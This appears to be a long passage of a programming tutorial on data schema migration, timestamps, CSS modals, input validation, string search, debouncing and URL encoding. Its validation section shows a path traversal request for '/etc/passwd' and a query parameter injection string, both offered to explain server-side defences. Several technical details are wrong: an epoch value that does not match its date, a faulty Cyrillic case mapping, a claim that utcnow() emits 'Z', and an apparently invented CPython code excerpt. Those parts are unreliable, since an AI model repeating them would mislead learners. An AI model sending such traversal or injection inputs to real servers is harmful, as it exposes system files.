**Depth Needed:** This level represents a critical inflection point - evolving your data schema while maintaining backward compatibility, and understanding the CSS positioning system that makes modals possible.

---

### **Part 1: Schema Evolution - The Database Migration Problem**

**The Fundamental Challenge:**

Your initial `locks.json`:

```python
{
    "file1.mcam": "user@example.com"  # Simple string
}
```

Your new `locks.json`:

```python
{
    "file1.mcam": {
        "user": "user@example.com",
        "message": "Working on redesign",
        "timestamp": "2025-10-03T14:30:00Z"
    }
}
```

**This is a schema migration** - a concept from database theory.

**The Migration Problem:**

```python
# What happens to OLD data when you deploy NEW code?

# Old code expects:
def get_lock_user(filename):
    return locks[filename]  # Returns "user@example.com"

# New code expects:
def get_lock_user(filename):
    return locks[filename]["user"]  # TypeError if old data exists!
```

**Solution Strategies:**

**1. Destructive Migration (Your Tutorial's Approach):**

```python
# Simple but loses old data
def migrate_v1_to_v2():
    # Delete locks.json and start fresh
    locks = {}
    save_locks(locks)
```

**2. Non-Destructive Migration (Production Approach):**

```python
def load_locks_with_migration():
    locks = load_data(LOCK_FILE_PATH)
    migrated = {}

    for filename, lock_data in locks.items():
        # Detect old format (string) vs new format (dict)
        if isinstance(lock_data, str):
            # Migrate old format
            migrated[filename] = {
                "user": lock_data,
                "message": "Legacy lock (no message)",
                "timestamp": datetime.datetime.utcnow().isoformat()
            }
        else:
            # Already new format
            migrated[filename] = lock_data

    return migrated
```

**3. Version-Tagged Schema (Enterprise Approach):**

```python
# locks.json with schema version
{
    "_schema_version": 2,
    "data": {
        "file1.mcam": {
            "user": "user@example.com",
            "message": "Working on it",
            "timestamp": "2025-10-03T14:30:00Z"
        }
    }
}

# Migration dispatcher
def load_locks():
    raw_data = load_data(LOCK_FILE_PATH)
    version = raw_data.get("_schema_version", 1)

    # Dispatch to appropriate handler
    if version == 1:
        return migrate_v1_to_v2(raw_data)
    elif version == 2:
        return raw_data["data"]
    else:
        raise UnsupportedSchemaVersion(version)
```

**Why versioning matters:**

```python
# Without versioning: Ambiguous data
{"file1.mcam": {...}}  # Is this v1 or v2?

# With versioning: Unambiguous
{
    "_schema_version": 2,
    "data": {"file1.mcam": {...}}
}
```

---

### **DateTime Serialization: The ISO 8601 Standard**

```python
"timestamp": datetime.datetime.utcnow().isoformat()
```

**Why ISO 8601 format?**

**The Problem:** Dates are culturally ambiguous:

```
"10/03/2025" → October 3 (US) or March 10 (Europe)?
"2025-10-03" → Unambiguous (ISO 8601)
```

**The ISO 8601 Format:**

```python
# Format: YYYY-MM-DDTHH:MM:SS.ffffff+HH:MM
"2025-10-03T14:30:45.123456+00:00"
 │    │  │ │  │  │  │  │      │  │
 │    │  │ │  │  │  │  │      └──┴─ Timezone offset
 │    │  │ │  │  │  │  └─────────── Microseconds
 │    │  │ │  │  │  └────────────── Seconds
 │    │  │ │  │  └───────────────── Minutes
 │    │  │ │  └──────────────────── Hours (24-hour)
 │    │  │ └─────────────────────── Date/Time separator
 │    │  └────────────────────────── Day
 │    └───────────────────────────── Month
 └────────────────────────────────── Year
```

**Why UTC (Coordinated Universal Time)?**

```python
# BAD: Store local time (ambiguous)
timestamp = datetime.datetime.now().isoformat()
# "2025-10-03T14:30:45"  # What timezone? Daylight saving?

# GOOD: Store UTC (unambiguous reference point)
timestamp = datetime.datetime.utcnow().isoformat()
# "2025-10-03T14:30:45Z"  # Z = Zulu = UTC = +00:00

# Display in user's timezone (frontend handles this)
```

**Parsing ISO 8601 in JavaScript:**

```javascript
const timestamp = "2025-10-03T14:30:45Z";
const date = new Date(timestamp);

// JavaScript Date object stores milliseconds since Unix epoch
console.log(date.getTime()); // 1728051045000

// Unix epoch = 1970-01-01T00:00:00Z
// Milliseconds elapsed since then
```

**The Date Object Internal Representation:**

```javascript
// Date is stored as a single 64-bit float:
class Date {
  constructor(timestamp) {
    this._time = parseTimestamp(timestamp); // Milliseconds since epoch
  }

  getTime() {
    return this._time; // Fast: just returns stored value
  }

  getFullYear() {
    // Convert milliseconds to year (complex calculation)
    const days = Math.floor(this._time / 86400000);
    // Account for leap years, etc.
    return calculateYear(days);
  }
}
```

**Time Complexity of Date Operations:**

```javascript
Operation                    Time Complexity
────────────────────────────────────────────
new Date(isoString)          O(n) - must parse string
date.getTime()               O(1) - stored as number
date.getFullYear()           O(1) - mathematical calculation
date.toISOString()           O(1) - format from stored number
date1 < date2                O(1) - numeric comparison
```

**Timezone Conversion (The Hidden Complexity):**

```javascript
// Browser automatically converts to local timezone for display
const utcDate = new Date("2025-10-03T14:30:45Z");

console.log(utcDate.toString());
// "Thu Oct 03 2025 10:30:45 GMT-0400 (Eastern Daylight Time)"
// Automatically converted to user's timezone!

console.log(utcDate.toISOString());
// "2025-10-03T14:30:45.000Z"
// Back to UTC for storage
```

**Daylight Saving Time (DST) - The Nightmare:**

```python
# Problem: "Spring forward" - hour disappears
# 2025-03-09 02:00:00 → 2025-03-09 03:00:00 (in US)
# 02:30:00 never exists!

from datetime import datetime, timezone
import pytz

# WRONG: Use local timezone
eastern = pytz.timezone('US/Eastern')
dt = eastern.localize(datetime(2025, 3, 9, 2, 30))  # NonExistentTimeError!

# RIGHT: Always store UTC
dt = datetime(2025, 3, 9, 7, 30, tzinfo=timezone.utc)  # 2:30 AM EST = 7:30 AM UTC
# No ambiguity, no DST issues
```

---

### **Part 2: Modal Dialogs - The CSS Positioning System**

Your tutorial creates a modal overlay. This requires understanding CSS positioning.

**The CSS Positioning Property (A Finite State Machine):**

```css
position: static | relative | absolute | fixed | sticky;
```

Each value changes how the element is positioned:

**1. Static (Default):**

```css
/* Normal document flow */
position: static;
/* Element positioned by its place in HTML */
/* top, left, right, bottom have NO effect */
```

**2. Relative:**

```css
/* Positioned relative to where it WOULD be in normal flow */
position: relative;
top: 10px; /* Moves DOWN 10px from original position */
left: 20px; /* Moves RIGHT 20px from original position */

/* Original space is RESERVED (other elements don't move) */
```

**Visual Example:**

```
Normal flow:    [Box A] [Box B] [Box C]

position: relative; top: 10px; on Box B:
                [Box A]
                        [Box B] (shifted down, space reserved)
                [Box C]
```

**3. Absolute (The Modal's Key Property):**

```css
/* Positioned relative to nearest positioned ancestor */
position: absolute;
top: 0;
left: 0;

/* Removed from normal flow (other elements ignore it) */
/* Creates new stacking context */
```

**The Ancestor Search Algorithm:**

```html
<div id="grandparent" style="position: relative;">
  <div id="parent">
    <div id="child" style="position: absolute; top: 10px;">
      Where am I positioned?
    </div>
  </div>
</div>
```

**Browser's positioning algorithm:**

```javascript
function findPositioningAncestor(element) {
  let current = element.parentElement;

  // Walk up the tree
  while (current !== null) {
    const position = getComputedStyle(current).position;

    // Stop at first positioned ancestor
    if (position !== "static") {
      return current; // Found it!
    }

    current = current.parentElement;
  }

  // No positioned ancestor - use viewport
  return document.documentElement;
}

// child is positioned relative to #grandparent (has position: relative)
// NOT relative to #parent (position: static - skipped)
```

**4. Fixed (Modal Overlay):**

```css
/* Positioned relative to VIEWPORT (browser window) */
position: fixed;
top: 0;
left: 0;
width: 100%;
height: 100%;

/* Stays in place when scrolling */
/* Removed from normal flow */
```

**Your Modal CSS:**

```css
.modal-overlay {
  position: fixed; /* Relative to viewport */
  top: 0; /* Flush with top edge */
  left: 0; /* Flush with left edge */
  width: 100%; /* Full viewport width */
  height: 100%; /* Full viewport height */
  background-color: rgba(0, 0, 0, 0.6); /* Semi-transparent black */
  display: flex; /* Flexbox for centering */
  justify-content: center; /* Center horizontally */
  align-items: center; /* Center vertically */
  z-index: 1000; /* Stack above other content */
}
```

---

### **Z-Index and Stacking Contexts (The 3D Layer System)**

**The Problem:** Multiple overlapping elements. Who appears on top?

**The Stacking Order (Without z-index):**

```
                    ┌─────────────┐
                    │ Positioned  │ (highest)
                    │ elements    │
                    └─────────────┘
                    ┌─────────────┐
                    │ Floats      │
                    └─────────────┘
                    ┌─────────────┐
                    │ Block       │
                    │ elements    │
                    └─────────────┘
                    ┌─────────────┐
                    │ Background  │ (lowest)
                    └─────────────┘
```

**Adding z-index (Creating Explicit Stack Order):**

```css
/* z-index only works on positioned elements */
.element {
  position: relative; /* Must be positioned */
  z-index: 10; /* Stack level */
}
```

**The Stack Level as an Integer:**

```
Higher z-index = Closer to viewer

z-index: 1000  ┌───────────┐  ← Modal overlay
               │           │
z-index: 100   │  ┌─────┐  │  ← Dropdown menu
               │  │     │  │
z-index: 10    │  │  ┌──┼──┼─ ← Tooltip
               │  │  │  │  │
z-index: 1     │  │  │  │  │  ← Normal content
               └──┴──┴──┴──┘
```

**Stacking Contexts (The Isolation Boundary):**

**A stacking context is created by:**

1. Root element (`<html>`)
2. `position: absolute/relative/fixed` with `z-index` not `auto`
3. `opacity < 1`
4. `transform`, `filter`, `perspective` (any non-default value)
5. `isolation: isolate`

**The Critical Rule:** z-index only compares within the same stacking context.

**Example:**

```html
<div style="position: relative; z-index: 1;">
  <div style="position: relative; z-index: 9999;">
    I'm inside parent with z-index: 1
  </div>
</div>

<div style="position: relative; z-index: 2;">I'm at z-index: 2</div>

<!-- z-index: 2 appears ABOVE z-index: 9999! -->
<!-- Because 9999 is isolated inside its parent's stacking context -->
```

**The Stacking Context Tree:**

```
Root stacking context (z-index: auto)
  ├─ Element A (z-index: 1)
  │    └─ Child (z-index: 9999)  ← Isolated inside A
  └─ Element B (z-index: 2)      ← Appears above A and all its children
```

**Why Your Modal Uses z-index: 1000:**

```css
.modal-overlay {
  z-index: 1000; /* High value to ensure it's above everything */
}

/* Most website content uses z-index: 1-100 */
/* Modals typically use z-index: 900-1000 */
/* Tooltips use z-index: 1000-1100 */
/* Critical alerts use z-index: 9999+ */
```

---

### **Part 3: Flexbox for Centering (The Modern Solution)**

**The Historical Context:**

**Ancient method (table-based layout):**

```html
<table width="100%" height="100%">
  <tr>
    <td align="center" valign="middle">Content</td>
  </tr>
</table>
```

**CSS2 method (absolute positioning hack):**

```css
.centered {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%); /* Shift back by half own size */
}
```

**Modern method (Flexbox):**

```css
.container {
  display: flex;
  justify-content: center; /* Horizontal centering */
  align-items: center; /* Vertical centering */
}
```

**How Flexbox Centering Works:**

**The Flexbox Algorithm (Simplified):**

```javascript
function layoutFlexbox(container) {
  const children = container.children;
  const containerSize = container.size;

  // 1. Calculate total size of children
  let totalChildSize = 0;
  for (const child of children) {
    totalChildSize += child.size;
  }

  // 2. Calculate remaining space
  const remainingSpace = containerSize - totalChildSize;

  // 3. Distribute space based on justify-content
  if (container.justifyContent === "center") {
    // Put half the space before, half after
    let position = remainingSpace / 2;
    for (const child of children) {
      child.position = position;
      position += child.size;
    }
  } else if (container.justifyContent === "space-between") {
    // Distribute space evenly between items
    const gap = remainingSpace / (children.length - 1);
    let position = 0;
    for (let i = 0; i < children.length; i++) {
      children[i].position = position;
      position += children[i].size + gap;
    }
  }
  // ... other justify-content values
}
```

**Main Axis vs Cross Axis:**

```
flex-direction: row (default)
────────────────────────────────
Main Axis:  →  (horizontal)
Cross Axis: ↓  (vertical)

justify-content: Controls main axis
align-items: Controls cross axis

flex-direction: column
────────────────────────────────
Main Axis:  ↓  (vertical)
Cross Axis: →  (horizontal)

justify-content: Controls main axis (now vertical!)
align-items: Controls cross axis (now horizontal!)
```

**Your Modal Centering:**

```css
.modal-overlay {
  display: flex; /* Enable flexbox */
  flex-direction: row; /* Default - horizontal main axis */
  justify-content: center; /* Center on main axis (horizontal) */
  align-items: center; /* Center on cross axis (vertical) */
}

/* Result: .modal-content is centered both horizontally and vertically */
```

---

### **Part 4: Form Input Handling - The Textarea Element**

```html
<textarea
  id="modal-message"
  placeholder="Enter a checkout message..."
></textarea>
```

**Textarea vs Input:**

```
<input type="text">          <textarea>
─────────────────────────────────────────────────
Single line                  Multiple lines
Fixed height                 Resizable
value attribute              Text content between tags
maxlength in HTML            Can scroll if overflow
```

**The DOM API for Textarea:**

```javascript
const textarea = document.getElementById("modal-message");

// Properties
textarea.value; // Current text content
textarea.selectionStart; // Cursor position (start)
textarea.selectionEnd; // Cursor position (end)
textarea.textLength; // Total character count

// Methods
textarea.select(); // Select all text
textarea.setSelectionRange(start, end); // Select range
```

**Browser Behavior Details:**

```javascript
// The textarea stores text as UTF-16 code units
textarea.value = "Hello 👋"; // "Hello " = 6 chars, 👋 = 2 chars (surrogate pair)
console.log(textarea.value.length); // 8 (not 7!)

// Emoji and other Unicode characters can be multiple code units:
const text = "A👨‍👩‍👧‍👦B";
console.log(text.length); // 11 (not 3!)
// A = 1, 👨‍👩‍👧‍👦 = 9 (family emoji), B = 1

// Proper character counting requires grapheme clusters
console.log([...text].length); // 3 (correct!)
```

**Textarea Resizing:**

```css
textarea {
  resize: none; /* No resizing */
  resize: vertical; /* Vertical only */
  resize: horizontal; /* Horizontal only */
  resize: both; /* Both directions (default) */
}

/* How resize works internally:
   Browser adds invisible resize handle at bottom-right
   On drag, updates element.style.width/height directly
   Uses CSS cursor: nwse-resize for diagonal resize handle
*/
```

---

### **Part 5: Modal State Management (Show/Hide Pattern)**

```javascript
// Show modal
modal.classList.remove("hidden");

// Hide modal
modal.classList.add("hidden");
```

**The Hidden Class Pattern:**

```css
.hidden {
  display: none !important; /* Completely removed from layout */
}

/* Alternative: Visibility-based hiding */
.invisible {
  visibility: hidden; /* Hidden but space reserved */
}

/* Alternative: Opacity-based hiding */
.transparent {
  opacity: 0; /* Invisible but interactive */
  pointer-events: none; /* Make non-interactive */
}
```

**Performance Comparison:**

```
Property         Layout Impact    Accessibility    Transitions
──────────────────────────────────────────────────────────────
display: none    Removed          Screen readers   ❌ Cannot
                 from tree        skip it          transition

visibility:      Space            Screen readers   ✓ Can
hidden           reserved         skip it          transition

opacity: 0       Space            Screen readers   ✓ Can
                 reserved         still read it    transition
```

**Why Your Tutorial Uses `display: none`:**

```css
.hidden {
  display: none;
}

/* Pros:
   - Completely removed from layout (no space wasted)
   - No accidental clicks
   - Screen readers ignore it
   
   Cons:
   - Cannot animate appearance (display is not animatable)
   - Forces reflow when shown
*/
```

**Alternative: Transitioning modals (better UX):**

```css
/* Better approach for smooth animations */
.modal-overlay {
  opacity: 0;
  pointer-events: none;
  transition: opacity 0.3s ease;
}

.modal-overlay:not(.hidden) {
  opacity: 1;
  pointer-events: auto;
}

/* Now modal fades in smoothly! */
```

**The Reflow Cost:**

```javascript
// Showing modal triggers reflow
modal.classList.remove("hidden"); // display: none → display: flex

// Browser must:
// 1. Recalculate styles for modal and all children
// 2. Rebuild layout tree (add modal subtree)
// 3. Recalculate positions of all elements
// 4. Repaint entire screen

// Cost: O(n) where n = number of elements in document
```

---

### **Part 6: Data Validation on Client and Server**

```javascript
const message = modalMessage.value.trim();
if (fileToCheckout && message) {
  handleCheckout(fileToCheckout, message);
} else {
  alert("Please enter a checkout message.");
}
```

**The Principle: Never Trust Client-Side Validation**

```
┌──────────────────────────────────────────────────┐
│ Client-Side Validation (JavaScript)              │
│ Purpose: Improve UX, provide immediate feedback  │
│ Security: ❌ CANNOT be trusted                   │
│ Why: User can bypass with DevTools               │
└──────────────────────────────────────────────────┘
                        ↓
                  HTTP Request
                        ↓
┌──────────────────────────────────────────────────┐
│ Server-Side Validation (Python/Pydantic)         │
│ Purpose: Enforce business rules, prevent attacks │
│ Security: ✓ MUST be present                      │
│ Why: Only server is under your control           │
└──────────────────────────────────────────────────┘
```

**Client-side validation bypass:**

```javascript
// User opens DevTools console and runs:
fetch("/api/files/checkout", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    filename: "../../../etc/passwd", // Path traversal attack
    message: "", // Empty message (bypassed client validation)
  }),
});

// If server doesn't validate, attacker can:
// - Lock arbitrary files
// - Inject malicious data
// - Crash the application
```

**Server-side defense:**

```python
class CheckoutRequest(BaseModel):
    filename: str
    message: str

    @validator('message')
    def message_not_empty(cls, v):
        if not v or not v.strip():
            raise ValueError('Message cannot be empty')
        return v.strip()

    @validator('filename')
    def filename_safe(cls, v):
        # Prevent path traversal
        if '..' in v or '/' in v or '\\' in v:
            raise ValueError('Invalid filename')
        # Only allow specific extensions
        if not v.endswith('.mcam'):
            raise ValueError('Invalid file type')
        return v
```

---

### **String Methods: The `.trim()` Algorithm**

```javascript
const message = modalMessage.value.trim();
```

**What `.trim()` does:**

```javascript
// Implementation (simplified):
String.prototype.trim = function () {
  // Unicode whitespace characters:
  // U+0009 (tab), U+000A (line feed), U+000D (carriage return)
  // U+0020 (space), U+00A0 (non-breaking space), etc.

  const whitespace = /^\s+|\s+$/g; // Regex: start or end whitespace
  return this.replace(whitespace, "");
};

// Example:
"  hello world  ".trim(); // "hello world"
"\t\nhello\r\n".trim(); // "hello"
```

**Time Complexity:**

```javascript
Operation        Time Complexity    Why
─────────────────────────────────────────────────────────
trim()           O(n)              Must scan entire string
trimStart()      O(n)              Must scan from start
trimEnd()        O(n)              Must scan from end

// Where n = string length
```

**Why trim user input:**

```javascript
// Without trim:
const message = "   Working on it   ";
save({ message: message });
// Wastes space in JSON, looks ugly in UI

// With trim:
const message = "   Working on it   ".trim(); // "Working on it"
save({ message: message });
// Clean, consistent data
```

---

### **Practice Exercise: Build a Modal State Machine**

Create a proper state machine for modal lifecycle:

```javascript
class ModalStateMachine {
  constructor(modalElement) {
    this.modal = modalElement;
    this.state = "CLOSED";
    this.data = null;
  }

  // State transitions
  open(data) {
    if (this.state !== "CLOSED") {
      throw new Error(`Cannot open from state ${this.state}`);
    }
    this.state = "OPENING";
    this.data = data;
    this.modal.classList.remove("hidden");

    // Transition to OPEN after animation
    setTimeout(() => {
      this.state = "OPEN";
    }, 300);
  }

  close() {
    if (this.state !== "OPEN") {
      throw new Error(`Cannot close from state ${this.state}`);
    }
    this.state = "CLOSING";
    this.modal.classList.add("hidden");

    setTimeout(() => {
      this.state = "CLOSED";
      this.data = null;
    }, 300);
  }

  isOpen() {
    return this.state === "OPEN" || this.state === "OPENING";
  }
}

// Usage:
const modal = new ModalStateMachine(document.getElementById("modal"));
modal.open({ filename: "test.mcam" });
// modal.open() → Error! Already opening
```

**Question:** Why is this better than just toggling a CSS class?

**Answer:**

1. Prevents invalid state transitions (can't open an already-open modal)
2. Provides hooks for animations and cleanup
3. Makes state explicit and queryable
4. Self-documenting - behavior is in code, not scattered across event handlers

---

Ready for Level 8 (Improving the UI - Implementing Search) when you've absorbed this material. The next level covers string searching algorithms, debouncing/throttling, and URL query parameter encoding.

## **Level 8 Enhancement: Improving the UI - Implementing Search**

**Reference:** Your tutorial adds a search box that filters files by name, introduces debouncing, and uses query parameters.

**Depth Needed:** This level touches on fundamental algorithms (string matching), performance optimization patterns (debouncing), and web protocols (URL encoding). Let me unpack the computer science that makes search efficient.

---

### **Part 1: String Searching Algorithms**

```python
if search.lower() in filename.lower():
```

**This simple line hides significant algorithmic complexity.**

**What Python's `in` operator does:**

```python
# Your code:
"1234567" in "PN1234567_OP1.mcam"

# Python uses Boyer-Moore-Horspool algorithm (optimized)
# Let's understand by building from basics
```

**Algorithm 1: Naive String Search (What You'd First Think Of)**

```python
def naive_search(text, pattern):
    """
    Search for pattern in text.

    Time Complexity: O(n * m)
    where n = len(text), m = len(pattern)
    """
    n = len(text)
    m = len(pattern)

    # Try each position in text
    for i in range(n - m + 1):
        # Check if pattern matches starting at position i
        match = True
        for j in range(m):
            if text[i + j] != pattern[j]:
                match = False
                break

        if match:
            return i  # Found at position i

    return -1  # Not found

# Example trace:
text = "PN1234567_OP1"
pattern = "1234"

# i=0: "PN12" vs "1234" → P≠1, no match
# i=1: "N123" vs "1234" → N≠1, no match
# i=2: "1234" vs "1234" → MATCH! Return 2
```

**Why naive search is slow:**

```
Text:    A B C D E F G H
Pattern: C D X

Position 0:
A B C D E F G H
C D X
↑ A≠C, shift

Position 1:
A B C D E F G H
  C D X
  ↑ B≠C, shift

Position 2:
A B C D E F G H
    C D X
    ↑ ↑ ↑
    C=C, D=D, E≠X, shift

# Compared 8 characters for a 3-character pattern!
```

**Algorithm 2: Boyer-Moore-Horspool (What Python Actually Uses)**

```python
def build_bad_char_table(pattern):
    """
    Build a table of how far to skip on mismatch.

    Time Complexity: O(m) where m = len(pattern)
    """
    table = {}
    m = len(pattern)

    # For each character in pattern, store distance from end
    for i in range(m - 1):
        table[pattern[i]] = m - 1 - i

    # Default shift for characters not in pattern
    return table

def boyer_moore_horspool(text, pattern):
    """
    Optimized string search.

    Best case: O(n/m) - can skip m characters at a time!
    Worst case: O(n*m) - rare, only with pathological input
    Average case: O(n) - much better than naive
    """
    n = len(text)
    m = len(pattern)

    if m > n:
        return -1

    # Build skip table
    skip = build_bad_char_table(pattern)
    default_skip = m

    # Start from position 0, but check pattern right-to-left
    i = 0
    while i <= n - m:
        # Check pattern from right to left
        j = m - 1
        while j >= 0 and text[i + j] == pattern[j]:
            j -= 1

        if j < 0:
            return i  # Found match!

        # Mismatch: use skip table
        mismatch_char = text[i + m - 1]
        shift = skip.get(mismatch_char, default_skip)
        i += shift

    return -1

# Example with skip table:
pattern = "1234"
skip_table = {'1': 3, '2': 2, '3': 1}  # Distance from end

text = "PN1234567_OP1"
#       PN1234567_OP1
#       1234
#          ↑ Check last char first (4)
#          P≠4, and P not in pattern
#          Skip entire pattern length (4)
#       PN1234567_OP1
#           1234
#              ↑ Check 3: 3=3 ✓
#             ↑ Check 2: 2=2 ✓
#            ↑ Check 1: 1=1 ✓
#           ↑ Check 1: 1=1 ✓ MATCH!

# Only checked 8 positions instead of 10!
```

**Why Boyer-Moore is faster:**

```
Key insight: Check pattern RIGHT-TO-LEFT
If last character doesn't match AND isn't in pattern,
skip the entire pattern length!

Text:    A B C D E F G H I J
Pattern:       X Y Z

Position 0:
A B C D E F G H I J
X Y Z
    ↑ Check last first: D≠Z
    D is not in "XYZ"
    Skip entire pattern (3 chars)

Position 3:
A B C D E F G H I J
      X Y Z
        ↑ Check G≠Z, skip 3

# Can eliminate positions without checking every character!
```

**Python's actual implementation is even more sophisticated:**

```c
// CPython's string search (stringlib/fastsearch.h)
// Uses different algorithms based on pattern length:

if (pattern_len == 1) {
    // Single character: use memchr (assembly-optimized)
    return memchr(text, pattern[0], text_len);
}
else if (pattern_len < 10) {
    // Short patterns: use Two-Way algorithm
    return two_way_search(text, pattern);
}
else {
    // Long patterns: use Boyer-Moore-Horspool
    return bmh_search(text, pattern);
}
```

---

### **Case-Insensitive Search: The Hidden Cost**

```python
if search.lower() in filename.lower():
```

**What `.lower()` actually does:**

```python
# Conceptual implementation
def lower(string):
    result = []
    for char in string:
        # Unicode case mapping table lookup
        lowercase_char = UNICODE_CASE_TABLE[char]
        result.append(lowercase_char)
    return ''.join(result)

# Time Complexity: O(n) where n = string length
# Space Complexity: O(n) - creates new string
```

**The Unicode Case Mapping Table:**

```python
# Simplified version:
UNICODE_CASE_TABLE = {
    'A': 'a', 'B': 'b', 'C': 'c', ...,  # Basic Latin
    'Ä': 'ä', 'Ö': 'ö', 'Ü': 'ü',      # Latin Extended
    'Σ': 'σ', 'Π': 'π',                # Greek
    'Б': 'б', 'Д': 'd',                # Cyrillic
    # ... thousands more mappings
}

# Actual Python implementation uses:
# - Compact bit-packed tables
# - Range-based lookups for sequential letters
# - Special handling for Turkish İ/i (context-dependent!)
```

**The Turkish I Problem (A Famous Unicode Edge Case):**

```python
# In most languages:
"I".lower() == "i"  # True

# In Turkish:
"I".lower() == "ı"  # Dotless i
"İ".lower() == "i"  # Dotted I

# Python uses locale-independent mapping by default
# Avoids context-dependent behavior for consistency
```

**Performance analysis of your search:**

```python
# Your code:
for filename in repo_files:
    if search.lower() in filename.lower():  # Create 2 new strings per file!
        ...

# If repo has 1000 files, average filename 20 chars:
# - 1000 × 20 = 20,000 character conversions for filenames
# - 1000 × len(search) conversions for search term
# Total: ~20,000-30,000 character operations per search

# Optimization:
search_lower = search.lower()  # Convert once!
for filename in repo_files:
    if search_lower in filename.lower():  # Only convert filename
        ...

# Now: 20,000 conversions (1000 files × 20 chars)
# Saved: 1000 × len(search) conversions
```

---

### **Part 2: Debouncing - The Rate Limiting Algorithm**

**The Problem:**

```javascript
// Without debouncing:
searchBox.addEventListener("input", () => {
  loadFiles(); // API call on EVERY keystroke!
});

// User types "1234567" (7 characters)
// Result: 7 API calls in ~500ms
// - 1
// - 12
// - 123
// - 1234
// - 12345
// - 123456
// - 1234567

// Server overwhelmed, network congested, wasteful
```

**The Solution: Debouncing**

```javascript
function debounce(func, delay) {
  let timeout; // Closure variable - persists between calls

  return function (...args) {
    // Clear previous timer
    clearTimeout(timeout);

    // Set new timer
    timeout = setTimeout(() => {
      func.apply(this, args);
    }, delay);
  };
}
```

**How it works (Timeline):**

```
User types "1234567" with 100ms between keystrokes
Debounce delay: 300ms

Time  Event           Timer State                Action
─────────────────────────────────────────────────────────
0ms   Type '1'        Start 300ms timer          (waiting)
100ms Type '2'        Cancel old, start new      (waiting)
200ms Type '3'        Cancel old, start new      (waiting)
300ms Type '4'        Cancel old, start new      (waiting)
400ms Type '5'        Cancel old, start new      (waiting)
500ms Type '6'        Cancel old, start new      (waiting)
600ms Type '7'        Cancel old, start new      (waiting)
700ms (pause)         Timer active               (waiting)
800ms (pause)         Timer active               (waiting)
900ms (pause)         Timer fires!               API call: "1234567"

Result: 1 API call instead of 7!
```

**The Debounce State Machine:**

```
State: IDLE
  ↓ (input event)
State: WAITING
  ↓ (input event) → Cancel timer, restart
State: WAITING
  ↓ (input event) → Cancel timer, restart
State: WAITING
  ↓ (delay expires, no new input)
State: EXECUTING
  ↓ (function completes)
State: IDLE
```

**Debounce vs Throttle (The Difference):**

```javascript
// DEBOUNCE: Wait for quiet period, then execute ONCE
// Use case: Search-as-you-type, form validation, window resize

function debounce(func, delay) {
  let timeout;
  return function (...args) {
    clearTimeout(timeout);
    timeout = setTimeout(() => func(...args), delay);
  };
}

// Timeline:
// Events:  ████████░░░░░█░░░░░
// Execute:            ↑       ↑
// (only after gaps)

// THROTTLE: Execute at most once per time period
// Use case: Scroll events, mouse movement, infinite scroll

function throttle(func, delay) {
  let lastCall = 0;
  return function (...args) {
    const now = Date.now();
    if (now - lastCall >= delay) {
      lastCall = now;
      func(...args);
    }
  };
}

// Timeline:
// Events:  ████████████████████
// Execute: ↑     ↑     ↑     ↑
// (regular intervals, even during continuous events)
```

**Advanced Debounce: Leading vs Trailing Edge**

```javascript
function debounce(func, delay, options = {}) {
  let timeout;
  let lastArgs;

  return function (...args) {
    lastArgs = args;

    // Leading edge: Execute immediately on first call
    if (options.leading && !timeout) {
      func.apply(this, args);
    }

    clearTimeout(timeout);

    timeout = setTimeout(() => {
      // Trailing edge: Execute after delay
      if (options.trailing !== false) {
        func.apply(this, lastArgs);
      }
      timeout = null;
    }, delay);
  };
}

// Leading edge example (search starts immediately):
const search = debounce(loadFiles, 300, { leading: true, trailing: true });
// First keystroke: Execute immediately
// Subsequent keystrokes: Wait for 300ms gap
```

---

### **Part 3: URL Query Parameters - The Encoding Problem**

```javascript
const params = new URLSearchParams({
  sort_by: currentSortBy,
  order: currentOrder,
});

if (searchTerm) {
  params.append("search", searchTerm);
}

const url = `/api/files?${params.toString()}`;
```

**What `URLSearchParams.toString()` does:**

**URL Encoding (Percent Encoding):**

```javascript
// Characters that need encoding:
// - Space → %20 or +
// - Special chars → %XX (hex)
// - Reserved chars: ? & = # / etc.

// Example:
const params = new URLSearchParams();
params.append("search", "file name with spaces");
params.append("description", "Uses & and = symbols");

console.log(params.toString());
// "search=file+name+with+spaces&description=Uses+%26+and+%3D+symbols"
//                                                   ↑         ↑
//                                                  & = %26   = = %3D
```

**The Encoding Algorithm:**

```javascript
function encodeURIComponent(str) {
  // Character categories:
  const unreserved = /[A-Za-z0-9\-_.~]/;

  let result = "";
  for (let i = 0; i < str.length; i++) {
    const char = str[i];

    if (unreserved.test(char)) {
      result += char; // Safe, no encoding needed
    } else {
      // Encode as %XX hex
      const byte = char.charCodeAt(0);
      result += "%" + byte.toString(16).toUpperCase();
    }
  }
  return result;
}

// Example:
encodeURIComponent("hello world"); // "hello%20world"
encodeURIComponent("50% off"); // "50%25%20off"
//                                        ↑
//                                    % itself encoded as %25!
```

**Why encoding is necessary:**

```
Without encoding (BROKEN):
/api/files?search=file&name
                      ↑ Browser thinks this starts a new parameter!

With encoding (CORRECT):
/api/files?search=file%26name
                      ↑ Encoded &, treated as part of value
```

**Security: The Query Parameter Injection Attack**

```javascript
// VULNERABLE:
const userInput = getUserInput();
const url = `/api/files?search=${userInput}`; // DON'T DO THIS!

// Attacker enters: "test&admin=true"
// Result: /api/files?search=test&admin=true
// Server sees two parameters: search="test", admin="true"

// SAFE:
const params = new URLSearchParams({ search: userInput });
const url = `/api/files?${params.toString()}`;
// Result: /api/files?search=test%26admin%3Dtrue
// Server sees one parameter: search="test&admin=true"
```

---

### **URLSearchParams: The Data Structure**

```javascript
const params = new URLSearchParams();
```

**Internal representation:**

```javascript
class URLSearchParams {
  constructor(init) {
    // Internally stored as array of [key, value] pairs
    // (Not object/map because keys can repeat!)
    this._list = [];

    if (typeof init === "object") {
      for (const [key, value] of Object.entries(init)) {
        this._list.push([key, String(value)]);
      }
    }
  }

  append(key, value) {
    // O(1) - just push to array
    this._list.push([key, String(value)]);
  }

  get(key) {
    // O(n) - linear search
    for (const [k, v] of this._list) {
      if (k === key) return v;
    }
    return null;
  }

  getAll(key) {
    // O(n) - collect all values for this key
    return this._list.filter(([k, v]) => k === key).map(([k, v]) => v);
  }

  toString() {
    // O(n) - serialize to string
    return this._list
      .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
      .join("&");
  }
}
```

**Why array instead of object?**

```javascript
// URLs can have duplicate keys:
/api/files?tag=urgent&tag=review&tag=needs-approval

// With object: { tag: 'needs-approval' } - loses earlier values!
// With array: [['tag', 'urgent'], ['tag', 'review'], ['tag', 'needs-approval']]

